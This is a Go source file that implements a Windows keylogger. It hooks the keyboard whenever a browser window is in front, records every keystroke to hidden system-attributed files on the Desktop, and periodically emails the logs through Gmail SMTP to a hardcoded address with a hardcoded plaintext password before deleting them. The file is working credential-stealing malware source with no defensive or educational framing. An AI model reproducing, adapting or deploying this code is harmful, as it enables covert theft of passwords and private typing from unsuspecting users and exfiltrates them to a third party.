package utils

import (
	"fmt"
	"io/ioutil"
	"os"
	"path"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"gopkg.in/gomail.v2"

	"github.com/MShoaei/Pineapple/windows"
)

var (
	//Buffer is a temporary space to store data
	Buffer strings.Builder

	// WndHook is a HANDLE to a WinEvent hook
	WndHook windows.HWINEVENTHOOK

	// KbdHook is a HANDLE to a Keyboard hook
	KbdHook windows.HHOOK

	Done chan struct{}
)

var (
	shift          bool
	caps           bool
	logsFolderPath string
	logFilePath    string
	logFile        *os.File

	// selfPath string
)

func init() {
	logsFolderPath = path.Join(os.Getenv("USERPROFILE"), "Desktop", "logs")
	logFilePath = path.Join(os.Getenv("USERPROFILE"), "Desktop", time.Now().Format("2006-01-02T15-04-05Z07-00"))
	if _, err := os.Stat(logFilePath); os.IsNotExist(err) {
		logFile, _ = os.Create(logFilePath)
		namePtr, _ := syscall.UTF16PtrFromString(logFilePath)
		err := windows.SetFileAttributes(namePtr, windows.FILE_ATTRIBUTE_HIDDEN|windows.FILE_ATTRIBUTE_SYSTEM)
		if err != nil {
			panic(err)
		}
	} else {
		logFile, _ = os.OpenFile(logFilePath, os.O_WRONLY|os.O_APPEND, os.ModeExclusive)
	}
	// Buffer.Grow(1048576 - Buffer.Cap())
	windows.GetKeyboardState(&KState)
	caps = KState[windows.VKCAPITAL] == 1
}

// Flush writes everything from Buffer to disk and resets the Buffer
func Flush() {
	if Buffer.Len() > 0 {
		_, _ = logFile.WriteString(Buffer.String())
		Buffer.Reset()
	}
	if info, _ := logFile.Stat(); info.Size() > 4096 {
		_ = logFile.Close()
		_ = os.Rename(logFilePath, path.Join(logsFolderPath, logFile.Name()))

		logFilePath = path.Join(os.Getenv("USERPROFILE"), "Desktop", time.Now().Format("2006-01-02T15-04-05Z07-00")+".txt")
		logFile, _ = os.Create(logFilePath)
		namePtr, _ := syscall.UTF16PtrFromString(logFilePath)
		err := windows.SetFileAttributes(namePtr, windows.FILE_ATTRIBUTE_HIDDEN|windows.FILE_ATTRIBUTE_SYSTEM)
		if err != nil {
			panic(err)
		}
	}
}

func compress(dir string) {

}

func SendEmail() {
	go func() {
		for {
			if files, _ := ioutil.ReadDir(logsFolderPath); len(files) > 5 {
				Done <- struct{}{}
			} else {
				time.Sleep(5 * time.Second)
			}
		}
	}()
	for {
		m := gomail.NewMessage()
		m.SetHeader("From", "temp.drive48@gmail.com")
		m.SetHeader("To", "temp.drive48@gmail.com")

		<-Done

		files, _ := ioutil.ReadDir(logsFolderPath)
		for _, f := range files {
			m.Attach(path.Join(logsFolderPath, f.Name()))
		}

		d := gomail.NewDialer("smtp.gmail.com", 587, "temp.drive48@gmail.com", "asus1234567809")
		if err := d.DialAndSend(m); err != nil {
			fmt.Println("we are fucked")
			return
		}

		for _, f := range files {
			_ = os.Remove(path.Join(logsFolderPath, f.Name()))
		}
	}
}

// Window is the callback function that receives window events
func Window(hook windows.HWINEVENTHOOK, event uint32, hwnd windows.HWND, idObject int32, idChild int32, dwEventThread uint32, dwmsEventTime uint32) uintptr {
	if event == windows.EVENT_SYSTEM_FOREGROUND {
		title := windows.GetWindowTextW(hwnd)

		Buffer.WriteString("--- ")
		Buffer.WriteString(title)
		Buffer.WriteString(" ---\r\n")

		if strings.Contains(title, "Mozilla") ||
			strings.Contains(title, "Chrome") ||
			strings.Contains(title, "Edge") ||
			strings.Contains(title, "Internet Explorer") {
			KbdHook = windows.SetWindowsHookExA(13, Key, 0, 0)
		} else {
			windows.UnhookWindowsHookEx(KbdHook)
			Flush()
		}
	}
	return 0
}

// Key logs all the keystrokes it recieves
func Key(nCode int, wParam, lParam uintptr) windows.LRESULT {
	if nCode == 0 && wParam == 0x100 {
		key := (*windows.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		shiftCheck := (windows.GetAsyncKeyState(windows.VKLSHIFT) & 0x8000) |
			(windows.GetAsyncKeyState(windows.VKRSHIFT) & 0x8000) |
			(windows.GetAsyncKeyState(windows.VKSHIFT) & 0x8000)
		if shiftCheck == 32768 {
			shift = true
		} else {
			shift = false
		}
		switch key.VkCode {
		case windows.VKBACK:
			Buffer.WriteString("[Back]")
		case windows.VKTAB:
			Buffer.WriteString("[Tab]")
		case windows.VKRETURN:
			Buffer.WriteString("[Enter]\r\n")
		case windows.VKESCAPE:
			Buffer.WriteString("[Esc]")
		case windows.VKSPACE:
			Buffer.WriteString(" ")
		case windows.VKPRIOR:
			Buffer.WriteString("[PageUp]")
		case windows.VKNEXT:
			Buffer.WriteString("[PageDown]")
		case windows.VKEND:
			Buffer.WriteString("[End]")
		case windows.VKHOME:
			Buffer.WriteString("[Home]")
		case windows.VKLEFT:
			Buffer.WriteString("[Left]")
		case windows.VKUP:
			Buffer.WriteString("[Up]")
		case windows.VKRIGHT:
			Buffer.WriteString("[Right]")
		case windows.VKDOWN:
			Buffer.WriteString("[Down]")
		case windows.VKSELECT:
			Buffer.WriteString("[Select]")
		case windows.VKPRINT:
			Buffer.WriteString("[Print]")
		case windows.VKEXECUTE:
			Buffer.WriteString("[Execute]")
		case windows.VKSNAPSHOT:
			Buffer.WriteString("[PrintScreen]")
		case windows.VKINSERT:
			Buffer.WriteString("[Insert]")
		case windows.VKDELETE:
			Buffer.WriteString("[Delete]")
		case windows.VKLWIN:
			Buffer.WriteString("[LeftWindows]")
		case windows.VKRWIN:
			Buffer.WriteString("[RightWindows]")
		case windows.VKAPPS:
			Buffer.WriteString("[Applications]")
		case windows.VKSLEEP:
			Buffer.WriteString("[Sleep]")
		case windows.VKNUMPAD0:
			Buffer.WriteString("[Pad 0]")
		case windows.VKNUMPAD1:
			Buffer.WriteString("[Pad 1]")
		case windows.VKNUMPAD2:
			Buffer.WriteString("[Pad 2]")
		case windows.VKNUMPAD3:
			Buffer.WriteString("[Pad 3]")
		case windows.VKNUMPAD4:
			Buffer.WriteString("[Pad 4]")
		case windows.VKNUMPAD5:
			Buffer.WriteString("[Pad 5]")
		case windows.VKNUMPAD6:
			Buffer.WriteString("[Pad 6]")
		case windows.VKNUMPAD7:
			Buffer.WriteString("[Pad 7]")
		case windows.VKNUMPAD8:
			Buffer.WriteString("[Pad 8]")
		case windows.VKNUMPAD9:
			Buffer.WriteString("[Pad 9]")
		case windows.VKMULTIPLY:
			Buffer.WriteString("*")
		case windows.VKADD:
			if shift {
				Buffer.WriteString("+")
			} else {
				Buffer.WriteString("=")
			}
		case windows.VKSEPARATOR:
			Buffer.WriteString("[Separator]")
		case windows.VKSUBTRACT:
			if shift {
				Buffer.WriteString("_")
			} else {
				Buffer.WriteString("-")
			}
		case windows.VKDECIMAL:
			Buffer.WriteString(".")
		case windows.VKDIVIDE:
			Buffer.WriteString("[Divide]")
		case windows.VKF1:
			Buffer.WriteString("[F1]")
		case windows.VKF2:
			Buffer.WriteString("[F2]")
		case windows.VKF3:
			Buffer.WriteString("[F3]")
		case windows.VKF4:
			Buffer.WriteString("[F4]")
		case windows.VKF5:
			Buffer.WriteString("[F5]")
		case windows.VKF6:
			Buffer.WriteString("[F6]")
		case windows.VKF7:
			Buffer.WriteString("[F7]")
		case windows.VKF8:
			Buffer.WriteString("[F8]")
		case windows.VKF9:
			Buffer.WriteString("[F9]")
		case windows.VKF10:
			Buffer.WriteString("[F10]")
		case windows.VKF11:
			Buffer.WriteString("[F11]")
		case windows.VKF12:
			Buffer.WriteString("[F12]")
		case windows.VKNUMLOCK:
			Buffer.WriteString("[NumLock]")
		case windows.VKSCROLL:
			Buffer.WriteString("[ScrollLock]")
		case windows.VKOEM1:
			if shift {
				Buffer.WriteString(":")
			} else {
				Buffer.WriteString(";")
			}
		case windows.VKOEM2:
			if shift {
				Buffer.WriteString("?")
			} else {
				Buffer.WriteString("/")
			}
		case windows.VKOEM3:
			if shift {
				Buffer.WriteString("~")
			} else {
				Buffer.WriteString("`")
			}
		case windows.VKOEM4:
			if shift {
				Buffer.WriteString("{")
			} else {
				Buffer.WriteString("[")
			}
		case windows.VKOEM5:
			if shift {
				Buffer.WriteString("|")
			} else {
				Buffer.WriteString("\\")
			}
		case windows.VKOEM6:
			if shift {
				Buffer.WriteString("}")
			} else {
				Buffer.WriteString("]")
			}
		case windows.VKOEM7:
			if shift {
				Buffer.WriteString(`"`)
			} else {
				Buffer.WriteString("'")
			}
		case windows.VKOEMPERIOD:
			if shift {
				Buffer.WriteString(">")
			} else {
				Buffer.WriteString(".")
			}
		case 0x30:
			if shift {
				Buffer.WriteString(")")
			} else {
				Buffer.WriteString("0")
			}
		case 0x31:
			if shift {
				Buffer.WriteString("!")
			} else {
				Buffer.WriteString("1")
			}
		case 0x32:
			if shift {
				Buffer.WriteString("@")
			} else {
				Buffer.WriteString("2")
			}
		case 0x33:
			if shift {
				Buffer.WriteString("#")
			} else {
				Buffer.WriteString("3")
			}
		case 0x34:
			if shift {
				Buffer.WriteString("$")
			} else {
				Buffer.WriteString("4")
			}
		case 0x35:
			if shift {
				Buffer.WriteString("%")
			} else {
				Buffer.WriteString("5")
			}
		case 0x36:
			if shift {
				Buffer.WriteString("^")
			} else {
				Buffer.WriteString("6")
			}
		case 0x37:
			if shift {
				Buffer.WriteString("&")
			} else {
				Buffer.WriteString("7")
			}
		case 0x38:
			if shift {
				Buffer.WriteString("*")
			} else {
				Buffer.WriteString("8")
			}
		case 0x39:
			if shift {
				Buffer.WriteString("(")
			} else {
				Buffer.WriteString("9")
			}
		}
		switch {
		case 0x41 <= key.VkCode && key.VkCode <= 0x5A:
			char := ToUnicode(key)
			if shift != caps {
				Buffer.WriteString(strings.ToUpper(char))
			} else {
				Buffer.WriteString(char)
			}
		}
		if Buffer.Len() >= 20 {
			Flush()
		}
	} else if nCode == 0 && wParam == 0x101 {
		key := (*windows.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		switch key.VkCode {
		case windows.VKCONTROL:
			Buffer.WriteString("[Ctrl]")
		case windows.VKCAPITAL:
			Buffer.WriteString("[CapsLock]")
			if caps {
				caps = false
			} else {
				caps = true
			}
		case windows.VKSHIFT:
			Buffer.WriteString("[Shift]")
		case windows.VKMENU:
			Buffer.WriteString("[Alt]")
		case windows.VKLSHIFT:
			Buffer.WriteString("[LeftShift]")
		case windows.VKRSHIFT:
			Buffer.WriteString("[RightShift]")
		case windows.VKLCONTROL:
			Buffer.WriteString("[LeftCtrl]")
		case windows.VKRCONTROL:
			Buffer.WriteString("[RightCtrl]")
		case windows.VKLMENU:
			Buffer.WriteString("[LeftMenu]")
		case windows.VKRMENU:
			Buffer.WriteString("[RightMenu]")
		}
	}
	return windows.CallNextHookEx(0, nCode, wParam, lParam)
}
